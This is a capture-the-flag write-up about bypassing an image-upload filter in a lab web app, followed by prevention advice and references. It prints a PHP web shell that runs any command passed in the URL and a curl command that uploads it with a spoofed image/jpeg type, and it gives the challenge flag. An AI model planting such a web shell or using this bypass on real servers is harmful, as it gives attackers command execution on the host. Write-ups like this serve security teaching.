### Challenge

We can start with this PHP script that allows executing commands with the server user's privileges through a file upload:
```php
<?php
if (isset($_GET['cmd'])) {
    $cmd = urldecode($_GET['cmd']);
    echo shell_exec($cmd);
} else {
    echo "No command found";
}
?>
```

Here, I can specify a command that the server will execute if it doesn't protect its file uploads. I decode the command using urldecode to allow entering URL-encoded parameters like ?cmd=ls%20-la. For example, since spaces will be URL-encoded by the server, I need to be able to enter command options.

Of course, the server does not accept .php files: Your image was not uploaded.

So, I need to find a way to make the server believe that my script is an image.

It's a whitelist, not a blacklist, because even if I change the extension to anything, the server still rejects it.

It accepts when we add a `.jpg` extension, but it places the image in a directory that is impossible to access through either routes or page elements.

Even with .jpg%20 or anything else, it's still impossible to access the script and therefore the commands, so the flag
can probably be obtained in a different way.

I tested by changing the MIME type of the POST request with: Content-type: /jpeg

Changing the content type didn't work, but we can force the server to interprete the file as an image :

```
curl -X POST -F "MAX_FILE_SIZE=100000" -F "uploaded=@script.php;type=image/jpeg" -F "Upload=Upload" http://192.168.56.107/index.php?page=upload
```

And we can get the flag in the response !

```
The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
```

### Vulnerability

This vulnerability is an insecure file upload, which allows for uploading scripts, such as PHP scripts,
enabling the execution of commands with server privileges, among other things. This has the impact of allowing an attacker to retrieve sensitive
information from the server or users, potentially leading to service disruption or data modification.

### How to prevent from insecure file upload
- List allowed extensions, like the challenge did
- Validate the file type, don't trust the Content-Type header as it can be spoofed
- Set a filename length limit, again like the challenge did
- Ensure that any libraries used are securely configured and kept up to date

### Ressources
- https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- https://book.hacktricks.xyz/pentesting-web/file-upload
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md
- https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass
- https://stackoverflow.com/questions/4074936/how-to-use-php-curl-to-send-images-with-the-correct-content-type
